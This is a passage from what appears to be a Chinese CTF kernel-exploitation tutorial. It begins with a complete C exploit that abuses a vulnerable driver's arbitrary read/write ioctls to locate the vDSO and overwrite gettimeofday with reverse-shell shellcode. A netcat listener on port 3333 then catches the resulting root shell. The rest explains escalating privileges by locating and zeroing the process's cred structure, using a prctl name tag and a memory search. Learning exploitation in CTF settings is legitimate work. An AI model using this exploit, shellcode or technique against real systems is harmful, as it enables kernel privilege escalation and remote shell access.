
```c
// gcc -static exp.c -o exp
// ffffffff810a78d0 T SyS_gettimeofday
// ffffffff810a78d0 T sys_gettimeofday
// ffffffff810b08f0 T do_gettimeofday
// ffffffff810c7350 T compat_SyS_gettimeofday
// ffffffff810c7350 T compat_sys_gettimeofday
//0x13d
#include <string.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/ioctl.h>
#include <fcntl.h>
#include <errno.h>
#include <sys/mman.h>
#include <assert.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/prctl.h>
#include <sys/time.h>
#include <sys/auxv.h>
#define GETTIMEOFDAY_FUN 0xB20
struct arbWriteNote
{
ssize_t addr;
ssize_t len;
char* data;
};
struct arbWriteNote arbWriteObj;
//用于反弹shell的shellcode，127.0.0.1:3333
//或者在比赛中可以直接写类似Orw打开flag的shellcode
char shellcode[]="\x90\x53\x48\x31\xC0\xB0\x66\x0F\x05\x48\x31\xDB\x48\x39\xC3\x75\x0F\x48\x31\xC0\xB0\x39\x0F\x05\x48\x31\xDB\x48\x39\xD8\x74\x09\x5B\x48\x31\xC0\xB0\x60\x0F\x05\xC3\x48\x31\xD2\x6A\x01\x5E\x6A\x02\x5F\x6A\x29\x58\x0F\x05\x48\x97\x50\x48\xB9\xFD\xFF\xF2\xFA\x80\xFF\xFF\xFE\x48\xF7\xD1\x51\x48\x89\xE6\x6A\x10\x5A\x6A\x2A\x58\x0F\x05\x48\x31\xDB\x48\x39\xD8\x74\x07\x48\x31\xC0\xB0\xE7\x0F\x05\x90\x6A\x03\x5E\x6A\x21\x58\x48\xFF\xCE\x0F\x05\x75\xF6\x48\x31\xC0\x50\x48\xBB\xD0\x9D\x96\x91\xD0\x8C\x97\xFF\x48\xF7\xD3\x53\x48\x89\xE7\x50\x57\x48\x89\xE6\x48\x31\xD2\xB0\x3B\x0F\x05\x48\x31\xC0\xB0\xE7\x0F\x05";
//open dev
int openDev(char* pos);
int get_gettimeofday_str_offset();
int main(int argc, char *argv[])
{
setvbuf(stdin,0,2,0);
setvbuf(stdout,0,2,0);
setvbuf(stderr,0,2,0);
int devFD;
int addrFD;
unsigned long memOffset;
pthread_t thread;
//open Dev
char* pos = "/dev/arbWriteModule";
devFD = openDev(pos);
char *buf = (char *)calloc(1,0x1000);
int gettimeofday_str_offset = get_gettimeofday_str_offset();
printf("gettimeofday str in vdso.so offset=0x%x\n",gettimeofday_str_offset);
size_t vdso_addr = -1;
for (size_t addr=0xffffffff80000000;addr < 0xffffffffffffefff;addr += 0x1000) {
//读取一页数据
arbitrary_read(devFD,0x1000,buf,addr);
//如果在对应的偏移处，正好是这个字符串，那么我们就能确定当前就是vdso的地址
//之所以能确定，是因为我们每次读取了0x1000字节数据，也就是1页，而vdso的映射也只是1页
if (!strcmp(buf+gettimeofday_str_offset,"gettimeofday")) {
printf("[+]find vdso.so!!\n");
vdso_addr = addr;
printf("[+]vdso in kernel addr=0x%lx\n",vdso_addr);
break;
}
}
if (vdso_addr == -1) {
printf("[-]can't find vdso.so!!\n");
}
size_t gettimeofday_addr = vdso_addr + GETTIMEOFDAY_FUN;
printf("[+]gettimeofday function in kernel addr=0x%lx\n",gettimeofday_addr);
//将gettimeofday处写入我们的shellcode，因为写操作在内核驱动里完成，内核可以读写执行vdso
//用户只能读和执行vdso
arbitrary_write(devFD,strlen(shellcode),shellcode,gettimeofday_addr);
sleep(1);
printf("[+]open a shell\n");
system("nc -lvnp 3333");
return 0;
}
int openDev(char* pos){
int devFD;
printf("[+] Open %s...\n",pos);
if ((devFD = open(pos, O_RDWR)) < 0) {
printf(" Can't open device file: %s\n",pos);
exit(1);
}
return devFD;
}
//获取vdso里的字符串"gettimeofday"相对vdso.so的偏移
int get_gettimeofday_str_offset() {
//获取当前程序的vdso.so加载地址0x7ffxxxxxxxx
size_t vdso_addr = getauxval(AT_SYSINFO_EHDR);
char* name = "gettimeofday";
if (!vdso_addr) {
printf("[-]error get name's offset\n");
}
//仅需要搜索1页大小即可，因为vdso映射就一页0x1000
size_t name_addr = memmem(vdso_addr, 0x1000, name, strlen(name));
if (name_addr < 0) {
printf("[-]error get name's offset\n");
}
return name_addr - vdso_addr;
}
void arbitrary_read(int devFD,int len,char *buf,size_t addr)
{
arbWriteObj.len = len;
arbWriteObj.data = buf;
arbWriteObj.addr = addr;
ioctl(devFD,111,&arbWriteObj);
}
void arbitrary_write(int devFD,int len,char *buf,size_t addr)
{
arbWriteObj.len = len;
arbWriteObj.data = buf;
arbWriteObj.addr = addr;
ioctl(devFD,222,&arbWriteObj);
}
```

参考：

<a href="elink@435K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6T1L8r3!0Y4i4K6u0W2j5%4y4V1L8W2)9J5k6h3&6W2N6q4)9J5c8Y4y4W2j5h3q4K6k6h3g2K6j5g2)9J5c8X3q4J5N6r3W2U0L8r3g2Q4x3V1k6V1k6i4c8S2K9h3I4K6i4K6u0r3x3e0l9@1y4U0V1@1x3U0p5&6i4K6y4r3L8%4m8K6i4K6g2X3M7X3g2I4N6h3g2K6N6q4)9#2k6X3#2A6M7$3y4Q4x3@1c8Q4x3U0f1%4b7W2)9J5y4e0t1J5M7X3g2I4N6h3g2K6N6q4)9J5y4e0g2r3K9h3c8Q4x3U0f1J5x3W2)9J5y4e0y4m8i4K6t1#2x3U0t1I4y4U0x3@1y4U0V1H3z5o6t1#2x3e0j5%4z5o6l9K6y4e0M7J5x3U0M7J5x3o6W2Q4x3U0f1J5x3W2)9J5y4e0u0o6i4K6t1#2x3U0u0K6j5$3#2Q4x3U0f1J5x3W2)9J5y4e0y4m8i4K6t1#2x3U0t1J5x3o6p5@1x3o6M7I4x3#2)9J5k6e0p5K6x3o6p5H3x3U0x3K6y4q4)9J5k6i4m8U0i4K6t1#2y4f1k6T1L8r3!0Y4i4K6u0W2i4K6t1#2x3U0u0Q4x3U0f1%4c8q4)9J5y4Y4u0W2M7i4g2W2M7%4c8Q4y4h3k6A6k6q4)9K6c8o6p5$3x3K6b7$3z5e0l9^5x3U0f1I4y4U0M7^5x3o6x3#2y4K6t1J5y4K6t1H3z5g2)9J5y4X3u0A6P5W2)9#2k6X3W2V1i4K6y4p5x3q4)9J5y4Y4g2@1L8g2)9#2k6X3#2W2k6r3W2#2L8g2)9K6c8r3c8A6M7%4c8J5K9h3u0#2N6r3g2Q4x3X3g2H3j5#2)9#2k6Y4y4W2j5i4u0U0K9q4)9#2k6Y4u0W2M7%4g2D9N6q4)9J5k6h3&6G2L8X3g2Q4x3X3c8@1j5i4y4C8i4K6u0V1j5X3I4G2k6#2)9J5k6o6u0Q4y4@1g2T1L8r3!0Y4i4K6N6q4k6X3W2J5M7%4c8Q4y4h3k6J5j5h3&6C8i4K6g2X3N6U0u0Q4y4@1g2J5j5h3&6C8i4K6g2X3N6U0t1&6i4K6u0V1y4#2)9J5k6o6p5H3y4o6j5&6y4o6t1I4z5g2)9J5k6i4m8U0i4K6g2X3N6U0u0Q4y4h3k6J5j5h3&6C8i4K6g2X3j5X3I4G2k6#2)9#2k6X3c8W2k6X3q4#2L8s2c8Q4x3U0k6#2N6r3#2Q4y4h3k6@1k6i4u0E0i4K6y4p5K9$3g2J5L8X3g2D9i4K6t1$3M7%4m8E0i4K6y4p5x3e0l9I4z5q4)9J5k6e0t1J5x3U0k6Q4x3X3f1K6x3o6l9I4i4K6u0W2y4o6b7#2x3l9`.`.">(15条消息) linux kernel pwn学习之劫持vdso_seaaseesa的博客-CSDN博客</a>

还有bsauce师傅的简书：<mark class="encrypted">889K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6%4N6%4N6Q4x3X3g2B7K9h3q4F1M7$3S2#2i4K6u0W2j5$3!0E0i4K6u0r3M7q4)9J5c8U0l9%4z5e0V1@1k6U0S2T1x3X3u0T1x3l9`.`.</mark>

### 2.劫持`cred`结构体

#### (1)前置知识

这个没啥好讲的，就是覆盖uig和gid为零蛋就行，唯一需要的就是寻找`cred`的地址。

#### (2)寻找地址

##### ①利用`prctl`函数

`task_srtuct`结构体是每个进程都会创建的一个结构体，保存当前进程的很多内容，其中就包括当前进程的`cred`结构体指针。

```c
//version 4.4.72
struct task_struct {
//............................................
/* process credentials */
const struct cred __rcu *ptracer_cred; /* Tracer's credentials at attach */
const struct cred __rcu *real_cred; /* objective and real subjective task
* credentials (COW) */
const struct cred __rcu *cred; /* effective (overridable) subjective task
* credentials (COW) */
char comm[TASK_COMM_LEN]; /* executable name excluding path
- access with [gs]et_task_comm (which lock
it with task_lock())
- initialized normally by setup_new_exec */
//............................................
}
```

给出的题目编译在4.4.72内核下。

也就是可以将`comm[TASK_COMM_LEN]`设置为指定的字符串，相当于打个标记，不过不同版本中可能有所不同，不如最新版本V5.14.13的Linux内核就有所不同，其中还加了一个`key`结构体指针：

```c
//version 5.14.13
struct task_struct {
//............................................
#ifdef CONFIG_THREAD_INFO_IN_TASK
/*
* For reasons of header soup (see current_thread_info()), this
* must be the first element of task_struct.
*/
stru/* Tracer's credentials at attach: */
const struct cred __rcu *ptracer_cred;
/* Objective and real subjective task credentials (COW): */
const struct cred __rcu *real_cred;
/* Effective (overridable) subjective task credentials (COW): */
const struct cred __rcu *cred;
#ifdef CONFIG_KEYS
/* Cached requested key. */
struct key *cached_requested_key;
#endif
/*
* executable name, excluding path.
*
* - normally initialized setup_new_exec()
* - access it with [gs]et_task_comm()
* - lock it with task_lock()
*/
char comm[TASK_COMM_LEN];
//............................................
}
```

然后就可以利用`prctl`函数的`PR_SET_NAME`功能来设置`task_struct`结构体中的`comm[TASK_COMM_LEN]`成员。

```c
char target[16];
strcpy(target,"tryToFindPIG007");
prctl(PR_SET_NAME,target);
```

##### ②内存搜索定位

通过内存搜索，比对我们输入的标记字符串，可以定位`comm[TASK_COMM_LEN]`成员地址，比如设置标记字符串为`"tryToFindPIG007"`:

![image-20211020162844474](upload/attach/202208/904686_WEQBFV2X262NKB5.jpg)

![image-20211020162934065](upload/attach/202208/904686_R7944NHK7VEYG8S.jpg)

![image-20211020163051697](upload/attach/202208/904686_XY3Y46SNRWZCEPR.jpg)

可以查看当前Cred结构中的内容：

![image-20211020163136129](upload/attach/202208/904686_D43EDK6HBEE32DD.jpg)
